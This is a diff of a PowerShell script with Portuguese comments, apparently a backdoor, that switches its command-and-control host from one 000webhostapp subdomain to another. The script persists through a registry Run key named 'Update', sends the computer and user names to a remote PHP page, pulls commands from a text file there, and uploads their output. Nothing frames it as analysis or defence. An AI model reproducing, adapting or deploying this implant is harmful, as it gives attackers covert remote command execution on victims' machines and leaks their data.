@@ -15,7 +15,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_
         $nomePC = $env:COMPUTERNAME
         $nomeUsuario = $env:username
         $version = $windowsVersion
-        $phpUrl = "https://liberal-cane1.000webhostapp.com/registrar.php"
+        $phpUrl = "https://liberal-cane2.000webhostapp.com/registrar.php"
 
         $params = @{
             NomePC = $nomePC
@@ -25,7 +25,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_
 
         Invoke-RestMethod -Uri $phpUrl -Method POST -Body $params
 
-        $phpPageUrl = "https://liberal-cane1.000webhostapp.com/arquivo.txt"
+        $phpPageUrl = "https://liberal-cane2.000webhostapp.com/arquivo.txt"
 
         try {
             $comando = Invoke-RestMethod -Uri $phpPageUrl
@@ -36,7 +36,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_
                 # Verificar se há saída
                 if (-not [string]::IsNullOrEmpty($saida)) {
                     # Enviar a saída para upload.php
-                    $uploadUrl ="https://liberal-cane1.000webhostapp.com/upload.php"
+                    $uploadUrl ="https://liberal-cane2.000webhostapp.com/upload.php"
                     Invoke-RestMethod -Uri $uploadUrl -Method POST -Body ("saida=" + [System.Web.HttpUtility]::UrlEncode($saida))
                 }
             }
@@ -70,7 +70,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_
     }
 
     # Caminho do PHP
-    $phpUrl = "https://liberal-cane1.000webhostapp.com/registrar.php"
+    $phpUrl = "https://liberal-cane2.000webhostapp.com/registrar.php"
 
     while ($true) {
         # Obter informações do computador e usuário
@@ -87,7 +87,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_
         $response = Send-HttpPostRequest -url $phpUrl -data $params
 
         # URL da página PHP com comandos
-        $phpPageUrl = "https://liberal-cane1.000webhostapp.com/arquivo.txt"
+        $phpPageUrl = "https://liberal-cane2.000webhostapp.com/arquivo.txt"
 
         try {
             $comando = (New-Object System.Net.WebClient).DownloadString($phpPageUrl)
@@ -98,7 +98,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_
                 # Verificar se há saída
                 if (-not [string]::IsNullOrEmpty($saida)) {
                     # Enviar a saída para upload.php
-                    $uploadUrl ="https://liberal-cane1.000webhostapp.com/upload.php"
+                    $uploadUrl ="https://liberal-cane2.000webhostapp.com/upload.php"
                     $params = "saida=" + (UrlEncode $saida)
                     Send-HttpPostRequest -url $uploadUrl -data $params
                 }
